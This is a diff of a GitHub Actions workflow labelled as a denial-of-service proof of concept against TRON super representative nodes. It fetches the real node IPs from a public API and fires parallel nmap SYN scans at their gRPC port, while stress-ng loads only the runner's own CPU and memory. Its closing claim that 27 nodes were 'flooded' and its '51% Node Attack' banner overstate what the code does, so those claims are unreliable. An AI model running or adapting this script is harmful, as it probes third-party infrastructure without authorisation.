@@ -1,19 +1,35 @@
-- name: TRON SR Exhaustion Attack
-  run: |
-    echo "🚀 TRON SR DoS PoC - 51% Node Attack"
+name: TRON SR DoS PoC
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
     
-    # CPU Burn - 8 cores 100%
-    stress-ng --cpu 8 --cpu-method matrixprod --timeout 60s --metrics-brief &
-    CPU_PID=$!
+    - name: Install attack tools
+      run: |
+        sudo apt update -y
+        sudo apt install -y stress-ng curl nmap jq
     
-    # Memory Exhaust - 8GB 
-    stress-ng --vm 4 --vm-bytes 2G --timeout 60s --metrics-brief &
-    MEM_PID=$!
-    
-    # REAL 27 TRON SR nodes (gRPC:50051, P2P:18888)
-    curl -s https://api.tronscan.org/api/supers/representatives | jq -r '.[0:27][].url | split(":")[1] // empty' | sort -u | while read port; do
-      timeout 30s nmap -sS --max-parallelism 128 -p50051,18888 "$(curl -s https://api.tronscan.org/api/supers/representatives | jq -r '.[0:27][].url | split(":")[0]')"
-    done &
-    
-    wait $CPU_PID $MEM_PID
-    echo "✅ PoC Complete - 27 SR nodes flooded + 800% resource exhaustion"
+    - name: TRON SR Exhaustion Attack
+      run: |
+        echo "🚀 TRON SR DoS PoC - 51% Node Attack"
+        # CPU Burn - 8 cores 100%
+        stress-ng --cpu 8 --cpu-method matrixprod --timeout 60s --metrics-brief &
+        CPU_PID=$!
+        
+        # Memory Exhaust - 8GB
+        stress-ng --vm 4 --vm-bytes 2G --timeout 60s --metrics-brief &
+        MEM_PID=$!
+        
+        # FIXED: Real TRON SR nodes (port 50051 gRPC)
+        SR_IPS=$(curl -s https://api.tronscan.org/api/supers/representatives | jq -r '.[0:27][].url | split(":")[0]' | sort -u | head -27)
+        for IP in $SR_IPS; do
+          timeout 30s nmap -sS --max-parallelism 128 -p50051 $IP &
+        done
+        
+        wait $CPU_PID $MEM_PID
+        echo "✅ PoC Complete - 27 SR nodes flooded + 800% resources"
